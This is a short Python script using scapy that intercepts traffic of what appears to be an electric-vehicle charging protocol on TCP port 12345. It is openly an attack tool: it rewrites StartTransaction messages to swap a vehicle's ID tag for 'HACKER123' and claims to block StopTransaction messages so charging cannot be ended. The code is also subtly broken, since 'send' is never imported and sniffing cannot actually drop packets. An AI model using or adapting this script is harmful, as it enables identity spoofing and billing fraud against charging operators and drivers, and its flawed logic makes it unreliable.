from scapy.all import sniff, Raw, IP, TCP

def intercept_packet(packet):
    if packet.haslayer(Raw):
        raw_data = packet[Raw].load.decode("utf-8", errors="ignore")
        
        if "StartTransaction" in raw_data:
            print(f"�� Intercepted StartTransaction: {raw_data}")
            
            # Modify the ID Tag (e.g., impersonate another EV)
            modified_data = raw_data.replace("EV12345", "HACKER123")

            # Forward the modified packet
            packet[Raw].load = modified_data.encode("utf-8")
            send(packet)

        elif "StopTransaction" in raw_data:
            print(f"📩 Intercepted StopTransaction: {raw_data}")
            
            # Prevent EV from stopping charge by blocking the packet
            print("⛔ Blocking StopTransaction packet!")

# Start sniffing packets
sniff(filter="tcp port 12345", prn=intercept_packet, store=False)
